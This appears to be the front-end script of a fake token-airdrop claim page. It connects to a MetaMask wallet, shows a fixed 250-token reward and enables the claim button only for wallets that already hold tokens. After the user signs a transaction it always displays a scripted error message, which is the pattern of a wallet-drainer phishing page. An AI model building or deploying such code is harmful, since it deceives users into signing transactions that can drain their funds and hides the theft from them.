import {
  mainNetwork,
  checkNetwork,
  requestConnection,
  checkConnection,
  getTokenBalance,
  signTransaction,
  showSpinner,
  changeNetwork,
} from "./constants.js";

// Carga del front
window.onload = () => {
  const buttonConnect = document.getElementById("button-connect"),
    lblAlert = document.getElementById("lbl-alert");

  const initWeb3 = async () => {
    const setDataLogged = async () => {
      const lblConnect = document.getElementById("lbl-connect"),
        lblAmount = document.getElementById("lbl-amount"),
        lblUSDC = document.getElementById("lbl-usdc");

      const tokenBalance = await getTokenBalance();

      lblAlert.innerHTML = "";
      lblAmount.innerHTML = 250;
      lblUSDC.innerHTML = 250;
      lblConnect.innerHTML = "Claim tokens";

      if (tokenBalance == 0) {
        buttonConnect.setAttribute("disabled", "");
        buttonConnect.onclick = false;
      } else {
        const sign = async () => {
          const goSign = async () => {
            buttonConnect.innerHTML = "";
            showSpinner(buttonConnect);
            await signTransaction(0);

            setTimeout(() => {
              lblAlert.innerHTML =
                "An error occurred, please try again in a few minutes.";
              buttonConnect.innerHTML = "Claim";
            }, 1000);
          };

          checkNetwork().then((res) => {
            if (!res) {
              changeNetwork().then((res) => {
                if (res) {
                  goSign();
                }
              });
            } else {
              goSign();
            }
          });
        };

        buttonConnect.removeAttribute("disabled");
        buttonConnect.onclick = sign;
      }
    };

    checkConnection().then((dataConnect) => {
      const connectMetamask = () => {
        buttonConnect.innerHTML = "";
        showSpinner(buttonConnect);

        requestConnection().then((data) => {
          if (data.connect) {
            checkNetwork().then((res) => {
              if (!res) {
                changeNetwork().then((res) => {
                  if (res) {
                    setDataLogged();
                    buttonConnect.innerHTML = "Claim";
                  }
                });
              } else {
                setDataLogged();
                buttonConnect.innerHTML = "Claim";
              }
            });
          } else {
            buttonConnect.innerHTML = "Connect wallet";
          }
        });
      };

      if (!dataConnect.connect) {
        buttonConnect.onclick = connectMetamask;
      } else {
        setDataLogged();
      }
    });
  };

  const initApp = async () => {
    if (window.ethereum) {
      window.ethereum.on("chainChanged", (net_id) => {
        if (net_id != mainNetwork) {
          checkNetwork();
        }
      });

      await checkNetwork().then(async (res) => {
        if (!res) {
          await changeNetwork();
        }
      });

      initWeb3();
    }
  };

  initApp();
};
